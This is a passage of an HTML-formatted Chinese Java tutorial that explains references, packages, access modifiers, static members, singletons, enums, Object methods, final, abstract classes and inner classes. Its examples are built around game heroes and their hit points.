class="keyword">public</span> <span class="title function_">Hero</span><span class="params">()</span>&#123;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="comment">//回血</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">huixue</span><span class="params">(<span class="type">int</span> xp)</span>&#123;</span><br><span class="line">        hp = hp + xp;</span><br><span class="line">        <span class="comment">//回血完毕后，血瓶=0</span></span><br><span class="line">        xp=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Hero</span><span class="params">(String name,<span class="type">float</span> hp)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.hp = hp;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Hero</span> <span class="variable">teemo</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">Hero</span>(<span class="string">&quot;提莫&quot;</span>,<span class="number">383</span>);</span><br><span class="line">        <span class="comment">//血瓶，其值是100</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">xueping</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//提莫通过这个血瓶回血</span></span><br><span class="line">         </span><br><span class="line">        teemo.huixue(xueping);</span><br><span class="line">         </span><br><span class="line">        System.out.println(xueping);</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引用和&#x3D;</p><p>果一个变量是基本类型<br>比如 int hp &#x3D; 50;<br>我们就直接管hp叫变量<br><strong>&#x3D;表示赋值的意思</strong>。<br>如果一个变量是类类型<br>比如 Hero h &#x3D; new Hero();<br>我们就管h叫做<strong>引用</strong>。<br><strong>&#x3D;不再是赋值的意思</strong><br><strong>&#x3D;表示指向的意思</strong><br>比如 Hero h &#x3D; new Hero();<br>这句话的意思是<br>引用h，指向一个Hero对象</p><p>类类型传参：</p><p><strong>类类型又叫引用</strong><br>第24行的引用 <strong>teemo</strong>与 第17行的引用<strong>hero</strong>，<strong>是不同的引用</strong><br>通过调用garen.attack(teemo, 100); 使得这<strong>两个引用都指向了同一个对象</strong><br>所以在第18行hero.hp &#x3D; hero.hp - damage; 就使得该对象的hp值，发生了变化<br>因此第25行，打印该对象的Hp值就是变化后的值</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line"> </span><br><span class="line">    String name; <span class="comment">// 姓名</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">float</span> hp; <span class="comment">// 血量</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">float</span> armor; <span class="comment">// 护甲</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> moveSpeed; <span class="comment">// 移动速度</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Hero</span><span class="params">(String name, <span class="type">float</span> hp)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.hp = hp;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 攻击一个英雄，并让他掉damage点血</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">(Hero hero, <span class="type">int</span> damage)</span> &#123;</span><br><span class="line">        hero.hp = hero.hp - damage;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Hero</span> <span class="variable">teemo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hero</span>(<span class="string">&quot;提莫&quot;</span>, <span class="number">383</span>);</span><br><span class="line">        <span class="type">Hero</span> <span class="variable">garen</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hero</span>(<span class="string">&quot;盖伦&quot;</span>, <span class="number">616</span>);</span><br><span class="line">        garen.attack(teemo, <span class="number">100</span>);</span><br><span class="line">        System.out.println(teemo.hp);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="包"><a href="#包" class="headerlink" title="包"></a>包</h3><p>package</p><p>把比较接近的类，规划在同一个包下</p><p>在最开始的地方声明该类所处于的包名</p><p>使用同一个包下的其他类，直接使用即可<br>但是要使用其他包下的类，必须import</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//Weapon类在其他包里，使用必须进行import</span></span><br><span class="line"><span class="keyword">import</span> property.Weapon;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">        </span><br><span class="line">    String name; <span class="comment">//姓名</span></span><br><span class="line">        </span><br><span class="line">    <span class="type">float</span> hp; <span class="comment">//血量</span></span><br><span class="line">        </span><br><span class="line">    <span class="type">float</span> armor; <span class="comment">//护甲</span></span><br><span class="line">        </span><br><span class="line">    <span class="type">int</span> moveSpeed; <span class="comment">//移动速度</span></span><br><span class="line">     </span><br><span class="line">    <span class="comment">//装备一把武器</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">equip</span><span class="params">(Weapon w)</span>&#123;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="访问修饰符"><a href="#访问修饰符" class="headerlink" title="访问修饰符"></a>访问修饰符</h3><p>成员变量有四种修饰符</p><p><strong>private</strong> 私有的<br><strong>package</strong>&#x2F;friendly&#x2F;default 不写<br><strong>protected</strong> 受保护的<br><strong>public</strong> 公共的</p><p>类之间的关系</p><p><strong>自身：</strong>指的是Hero自己<br><strong>同包子类：</strong>ADHero这个类是Hero的子类，并且和Hero处于<strong>同一个包下</strong><br><strong>不同包子类：</strong>Support这个类是Hero的子类，但是在<strong>另一个包下</strong><br><strong>同包类：</strong> GiantDragon 这个类和Hero是<strong>同一个包</strong>，但是彼此<strong>没有继承关系</strong><br><strong>其他类：</strong>Item这个类，<strong>在不同包</strong>，也没有继承关系的类</p><p><img src="https://stepimagewm.how2j.cn/612.png" alt="总结"></p><h3 id="类属性"><a href="#类属性" class="headerlink" title="类属性"></a>类属性</h3><p>当一个属性被<strong>static</strong>修饰的时候，就叫做<strong>类属性</strong>，又叫做<strong>静态属性</strong><br>当一个属性被声明成类属性，那么<strong>所有的对象，都共享一个值</strong><br>与对象属性对比：<br>不同对象的 对象属性 的值都可能不一样。<br>比如盖伦的hp 和 提莫的hp 是不一样的。<br>但是所有对象的类属性的值，都是一样的</p><p>如果一个属性声明成类属性，那么所有的对象，都共享这么一个值</p><p>所以类属性是可以被用作所有对象都一致的</p><h3 id="类方法"><a href="#类方法" class="headerlink" title="类方法"></a>类方法</h3><p><strong>类方法：</strong> 又叫做静态方法</p><p><strong>对象方法：</strong> 又叫实例方法，非静态方法</p><p>访问一个对象方法，必须<strong>建立在有一个对象</strong>的前提的基础上<br>访问类方法，<strong>不需要对象</strong>的存在，直接就访问</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">float</span> hp;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//实例方法,对象方法，非静态方法</span></span><br><span class="line">    <span class="comment">//必须有对象才能够调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">die</span><span class="params">()</span>&#123;</span><br><span class="line">        hp = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="comment">//类方法，静态方法</span></span><br><span class="line">    <span class="comment">//通过类就可以直接调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">battleWin</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;battle win&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">           <span class="type">Hero</span> <span class="variable">garen</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">           garen.name = <span class="string">&quot;盖伦&quot;</span>;</span><br><span class="line">           <span class="comment">//必须有一个对象才能调用</span></span><br><span class="line">           garen.die();</span><br><span class="line">            </span><br><span class="line">           <span class="type">Hero</span> <span class="variable">teemo</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">           teemo.name = <span class="string">&quot;提莫&quot;</span>;</span><br><span class="line">            </span><br><span class="line">           <span class="comment">//无需对象，直接通过类调用</span></span><br><span class="line">           Hero.battleWin();</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GiantDragon</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//私有化构造方法使得该类无法在外部通过new 进行实例化</span></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">GiantDragon</span><span class="params">()</span>&#123;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//准备一个类属性，指向一个实例化对象。 因为是类属性，所以只有一个</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">GiantDragon</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GiantDragon</span>();</span><br><span class="line">     </span><br><span class="line">    <span class="comment">//public static 方法，提供给调用者获取12行定义的对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> GiantDragon <span class="title function_">getInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>枚举enum是一种特殊的类(还是类)，使用枚举可以很方便的定义常</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Season</span> <span class="variable">season</span> <span class="operator">=</span> Season.SPRING;</span><br><span class="line">        <span class="keyword">switch</span> (season) &#123;</span><br><span class="line">        <span class="keyword">case</span> SPRING:</span><br><span class="line">            System.out.println(<span class="string">&quot;春天&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> SUMMER:</span><br><span class="line">            System.out.println(<span class="string">&quot;夏天&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> AUTUMN:</span><br><span class="line">            System.out.println(<span class="string">&quot;秋天&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> WINTER:</span><br><span class="line">            System.out.println(<span class="string">&quot;冬天&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;枚举<span class="keyword">enum</span>是一种特殊的类(还是类)，使用枚举可以很方便的定义常</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">Season</span> &#123;</span><br><span class="line">    SPRING,SUMMER,AUTUMN,WINTER</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-接口和继承"><a href="#7-接口和继承" class="headerlink" title="7.接口和继承"></a>7.接口和继承</h2><h4 id="super"><a href="#super" class="headerlink" title="super"></a>super</h4><p>实例化子类，父类的构造方法一定会被调用</p><p><strong>其父类的构造方法也会被调用</strong><br><strong>并且是父类构造方法先调用</strong><br><strong>子类构造方法会默认调用父类的 无参的构造方法</strong></p><p>父类显式提供两个构造方法</p><p>分别是无参的构造方法和带一个参数的构造方法</p><p><strong>使用关键字super 显式调用父类带参的构造方法</strong></p><h4 id="object"><a href="#object" class="headerlink" title="object"></a>object</h4><p>声明一个类的时候，默认是继承了Object<br>public class Hero <strong>extends Object</strong>,object是所有类的父类</p><p>Object类提供一个toString方法，所以所有的类都有toString方法<br>toString()的意思是返回当前对象的<strong>字符串表达</strong></p><p>通过 System.out.println 打印对象就是打印该对象的toString()返回值</p><p>当一个对象没有任何引用指向的时候，它就满足垃圾回收的条件</p><p>当它被垃圾回收的时候，它的finalize() 方法就会被调用。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">float</span> hp;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">finalize</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这个英雄正在被回收&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//只有一引用</span></span><br><span class="line">        Hero h;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">            <span class="comment">//不断生成新的对象</span></span><br><span class="line">            <span class="comment">//每创建一个对象，前一个对象，就没有引用指向了</span></span><br><span class="line">            <span class="comment">//那些对象，就满足垃圾回收的条件</span></span><br><span class="line">            <span class="comment">//当，垃圾堆积的比较多的时候，就会触发垃圾回收</span></span><br><span class="line">            <span class="comment">//一旦这个对象被回收，它的finalize()方法就会被调用</span></span><br><span class="line">            h = <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="equals-用于判断两个对象的内容是否相同"><a href="#equals-用于判断两个对象的内容是否相同" class="headerlink" title="equals() 用于判断两个对象的内容是否相同"></a>equals() 用于判断两个对象的内容是否相同</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">float</span> hp;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(o <span class="keyword">instanceof</span> Hero)&#123;</span><br><span class="line">            <span class="type">Hero</span> <span class="variable">h</span> <span class="operator">=</span> (Hero) o;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.hp == h.hp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Hero h1= <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        h1.hp = <span class="number">300</span>;</span><br><span class="line">        Hero h2= <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        h2.hp = <span class="number">400</span>;</span><br><span class="line">        Hero h3= <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        h3.hp = <span class="number">300</span>;</span><br><span class="line">         </span><br><span class="line">        System.out.println(h1.equals(h2));</span><br><span class="line">        System.out.println(h1.equals(h3));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title="&#x3D;&#x3D;"></a>&#x3D;&#x3D;</h4><p>用于判断两个引用，是否指向了同一个对象</p><h4 id="hashcode"><a href="#hashcode" class="headerlink" title="hashcode"></a>hashcode</h4><p>hashCode方法返回一个对象的哈希值</p><h4 id="final-1"><a href="#final-1" class="headerlink" title="final"></a>final</h4><p>当Hero被修饰成final的时候，表示Hero不能够被继承</p><p>Hero的useItem方法被修饰成final,那么该方法在ADHero中，不能够被重写</p><p>final修饰基本类型变量，表示该变量只有一次赋值机会</p><p>inal修饰引用<br>h引用被修饰成final，表示该引用只有<strong>1</strong>次指向对象的机会<br>所以17行会出现编译错误<br>但是，依然通过h引用修改对象的属性值hp，因为hp并没有final修饰</p><h4 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h4><p>在类中声明一个方法，这个方法没有实现体，是一个“空”方法</p><p>这样的方法就叫抽象方法，使用修饰符“abstract”</p><p>当一个类有抽象方法的时候，该类必须被声明为抽象类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line"> </span><br><span class="line">    <span class="type">float</span> hp;</span><br><span class="line"> </span><br><span class="line">    <span class="type">float</span> armor;</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> moveSpeed;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 抽象方法attack</span></span><br><span class="line">    <span class="comment">// Hero的子类会被要求实现attack方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ADHero</span> <span class="keyword">extends</span> <span class="title class_">Hero</span> <span class="keyword">implements</span> <span class="title class_">AD</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">physicAttack</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;进行物理攻击&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span> &#123;</span><br><span class="line">        physicAttack();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Hero类可以在不提供抽象方法的前提下，声明为抽象类<br>一旦一个类被声明为抽象类，就不能够被直接实例化</p><p>区别1：<br>子类只能继承一个抽象类，不能继承多个<br>子类可以实现<strong>多个</strong>接口<br>区别2：<br>抽象类可以定义<br>public,protected,package,private<br>静态和非静态属性<br>final和非final属性<br>但是接口中声明的属性，只能是<br>public<br>静态<br>final的<br>即便没有显式的声明</p><h4 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h4><p>内部类分为四种：<br>非静态内部类<br>静态内部类<br>匿名类<br>本地类</p><h5 id="非静态内部类"><a href="#非静态内部类" class="headerlink" title="非静态内部类"></a>非静态内部类</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name; <span class="comment">// 姓名</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">float</span> hp; <span class="comment">// 血量</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">float</span> armor; <span class="comment">// 护甲</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> moveSpeed; <span class="comment">// 移动速度</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 非静态内部类，只有一个外部类对象存在的时候，才有意义</span></span><br><span class="line">    <span class="comment">// 战斗成绩只有在一个英雄对象存在的时候才有意义</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">BattleScore</span> &#123;</span><br><span class="line">        <span class="type">int</span> kill;</span><br><span class="line">        <span class="type">int</span> die;</span><br><span class="line">        <span class="type">int</span> assit;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">legendary</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (kill &gt;= <span class="number">8</span>)</span><br><span class="line">                System.out.println(name + <span class="string">&quot;超神！&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                System.out.println(name + <span class="string">&quot;尚未超神！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Hero</span> <span class="variable">garen</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        garen.name = <span class="string">&quot;盖伦&quot;</span>;</span><br><span class="line">        <span class="comment">// 实例化内部类</span></span><br><span class="line">        <span class="comment">// BattleScore对象只有在一个英雄对象存在的时候才有意义</span></span><br><span class="line">        <span class="comment">// 所以其实例化必须建立在一个外部类对象的基础之上</span></span><br><span class="line">        <span class="type">BattleScore</span> <span class="variable">score</span> <span class="operator">=</span> garen.<span class="keyword">new</span> <span class="title class_">BattleScore</span>();</span><br><span class="line">        score.kill = <span class="number">9</span>;</span><br><span class="line">        score.legendary();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">float</span> hp;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">battleWin</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;battle win&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="comment">//敌方的水晶</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EnemyCrystal</span>&#123;</span><br><span class="line">        <span class="type">int</span> hp=<span class="number">5000</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//如果水晶的血量为0，则宣布胜利</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkIfVictory</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(hp==<span class="number">0</span>)&#123;</span><br><span class="line">                Hero.battleWin();</span><br><span class="line">                 </span><br><span class="line">                <span class="comment">//静态内部类不能直接访问外部类的对象属性</span></span><br><span class="line">                System.out.println(name + <span class="string">&quot; win this game&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//实例化静态内部类</span></span><br><span class="line">        Hero.<span class="type">EnemyCrystal</span> <span class="variable">crystal</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hero</span>.EnemyCrystal();</span><br><span class="line">        crystal.checkIfVictory();</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在一个类里面声明一个静态内部类<br>比如敌方水晶，当敌方水晶没有血的时候，己方所有英雄都取得胜利，而不只是某一个具体的英雄取得胜利。<br>与非静态内部类不同，<strong>静态内部类</strong>水晶类的实例化 <strong>不需要一个外部类的实例为基础</strong>，可以直接实例化<br>语法：<strong>new 外部类.静态内部类();</strong><br>因为没有一个外部类的实例，所以在静态内部类里面<strong>不可以访问外部类的实例属性和方法</strong><br>除了可以访问外部类的<strong>私有静态成员外</strong>，静态内部类和普通类没什么大的区别</p><h5 id="匿名类"><a href="#匿名类" class="headerlink" title="匿名类"></a>匿名类</h5><p>匿名类指的是在<strong>声明一个类的同时实例化它</strong>，使代码更加简洁精练<br>通常情况下，要使用一个接口或者抽象类，都必须创建一个子类</p><p>有的时候，为了快速使用，直接实例化一个抽象类，并“<strong>当场</strong>”实现其抽象方法。<br>既然实现了抽象方法，那么就是一个新的类，只是这个类，没有命名。<br>这样的类，叫做匿名类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line">   </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">    String name; <span class="comment">//姓名</span></span><br><span class="line">          </span><br><span class="line">    <span class="type">float</span> hp; <span class="comment">//血量</span></span><br><span class="line">          </span><br><span class="line">    <span class="type">float</span> armor; <span class="comment">//护甲</span></span><br><span class="line">          </span><br><span class="line">    <span class="type">int</span> moveSpeed; <span class="comment">//移动速度</span></span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span>;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">          </span><br><span class="line">        ADHero adh=<span class="keyword">new</span> <span class="title class_">ADHero</span>();</span><br><span class="line">        <span class="comment">//通过打印adh，可以看到adh这个对象属于ADHero类</span></span><br><span class="line">        adh.attack();</span><br><span class="line">        System.out.println(adh);</span><br><span class="line">          </span><br><span class="line">        <span class="type">Hero</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hero</span>()&#123;</span><br><span class="line">            <span class="comment">//当场实现attack方法</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;新的进攻手段&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        h.attack();</span><br><span class="line">        <span class="comment">//通过打印h，可以看到h这个对象属于Hero$1这么一个系统自动分配的类名</span></span><br><span class="line">          </span><br><span class="line">        System.out.println(h);</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="本地类"><a href="#本地类" class="headerlink" title="本地类"></a>本地类</h5><p>本地类可以理解为有名字的匿名类<br>内部类与匿名类不一样的是，内部类必须声明在成员的位置，即与属性和方法平等的位置。<br>本地类和匿名类一样，直接声明在代码块里面，可以是主方法，for循环里等等地方</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line">   </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">    String name; <span class="comment">//姓名</span></span><br><span class="line">          </span><br><span class="line">    <span class="type">float</span> hp; <span class="comment">//血量</span></span><br><span class="line">          </span><br><span class="line">    <span 